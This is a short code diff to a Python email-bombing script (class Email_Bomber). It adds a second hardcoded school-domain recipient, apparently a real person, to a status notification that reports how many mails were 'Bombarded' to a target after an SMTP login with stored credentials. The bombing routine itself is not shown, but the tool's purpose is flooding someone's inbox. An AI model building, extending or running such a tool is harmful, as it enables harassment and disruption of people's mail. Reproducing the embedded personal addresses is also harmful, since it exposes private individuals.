@@ -38,7 +38,7 @@ def banner():
  | |__ ______| |_) | ___  _ __ ___ | |__   ___ _ __ 
  |  __|______|  _ < / _ \| '_ ` _ \| '_ \ / _ | '__|
  | |____     | |_) | (_) | | | | | | |_) |  __/ |       
- |______|    |____/ \___/|_| |_| |_|_.__/ \___|_|   
+ |______|    |____/ \___/|_| |_| |_|_.__/ \___|_|         
                                                     
                                         version : {version}
                                         
@@ -145,6 +145,7 @@ class Email_Bomber:
         self.FROM = self.fromAddr
         self.PWD = self.fromPwd
         self.TO = "noa.roesken@stiftsgymnasium.de"
+        self.TO1 = "devin.bakhsh@stiftsgymnasium.de"
 
         self.MESSAGE_NOA = (f'{self.amount} Mails got sucesfuly Bombarded to {self.target}!')
 
@@ -157,6 +158,7 @@ class Email_Bomber:
         self.status_code, self.response = self.smtp.login(self.FROM, self.PWD)
 
         self.smtp.sendmail(self.FROM,self.TO,self.MESSAGE_NOA)
+        self.smtp.sendmail(self.FROM,self.TO1,self.MESSAGE_NOA)
 
         self.smtp.quit()
 
